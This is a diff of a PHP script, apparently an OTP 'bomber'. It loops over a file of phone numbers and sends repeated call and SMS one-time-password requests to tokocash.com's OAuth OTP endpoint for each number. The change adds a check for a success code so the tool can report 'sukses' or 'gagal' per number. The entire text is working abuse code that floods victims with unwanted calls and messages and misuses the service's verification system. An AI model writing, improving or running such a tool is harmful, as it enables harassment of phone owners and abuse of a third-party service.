@@ -57,8 +57,13 @@ isset($argv[1]) OR die($RR."[!] Input No List [!]\n".$X);
 $argv[1]=explode("\n", file_get_contents($argv[1]));
 //file_put_contents('array.php','<?php return'.var_export($argv[1],true).";\n");
 foreach($argv[1] as $argv[1]) {
-	post_data('https://www.tokocash.com/oauth/otp',"msisdn={$argv[1]}&accept=call");
-	post_data('https://www.tokocash.com/oauth/otp',"msisdn={$argv[1]}&accept=");
-	echo "Send OTP To -> ".$GG.$argv[1].$X."\n";
+	$r1 = post_data('https://www.tokocash.com/oauth/otp',"msisdn={$argv[1]}&accept=call");
+	$r2 = post_data('https://www.tokocash.com/oauth/otp',"msisdn={$argv[1]}&accept=");
+	if(strpos($r1.$r2, "20000") !== FALSE) {
+		$succ = "sukses";
+	} else {
+		$succ = "gagal";
+	}
+	echo "Send OTP To -> ".$GG.$argv[1].$X." {$succ}\n";
 }
 die($Y.'=========================== Cvar1984 ))=====(@)>'.$X."\n");
